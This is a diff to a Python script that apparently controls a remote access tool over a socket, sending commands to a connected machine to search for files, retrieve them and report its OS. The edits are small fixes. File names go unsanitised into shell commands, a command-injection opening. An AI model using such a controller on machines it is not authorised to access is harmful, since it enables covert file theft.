@@ -7,6 +7,7 @@ windowsFlag = "n"
 stop_threads = False
 pwd = ""
 
+
 def animation():
     while True:
         global stop_threads
@@ -87,6 +88,7 @@ def searchFile(connectionSocket, fileName):
     global windowsFlag
     if windowsFlag == "w":
         cmd = "dir \"" + fileName + "\" /a /s"
+        print(cmd)
     else:
         cmd = "find -name " + fileName
     connectionSocket.send(cmd.encode())  # 143
@@ -117,17 +119,6 @@ def clearScreen():
         os.system("clear")
 
 
-def SplitLine(mystring):
-    for item in mystring.split("\n"):
-        if "Directory of" in item or "Directory di" in item:
-            if "Directory of" in item:
-                filteredPath = item.strip().replace("Directory of ", "")
-            else:
-                filteredPath = item.strip().replace("Directory di ", "")
-            print(filteredPath)
-            return filteredPath
-
-
 def main():
     global windowsFlag, pwd
     esc = False
@@ -156,9 +147,10 @@ def main():
                 elif "cd" in cmd:
                     changeDirectory(connectionSocket)
 
-                elif "get" in cmd:
+                elif "get " in cmd:
                     fileName = cmd.replace("get ", "")
-                    getFile(connectionSocket, fileName)
+                    if not fileName == "":
+                        getFile(connectionSocket, fileName)
 
                 elif cmd == "infoOs":
                     d = connectionSocket.recv(1024).decode()
@@ -166,11 +158,9 @@ def main():
                     LogOnFile(d)
 
                 elif "search" in cmd:
+                    cmd = cmd + " "
                     toSearch = cmd.replace("search ", "")
                     output = searchFile(connectionSocket, toSearch)
-                    path = SplitLine(output)
-                    connectionSocket.send(path.encode())  # 146
-                    pwd = connectionSocket.recv(1024).decode()
 
                 elif cmd == "help":
                     print(help)
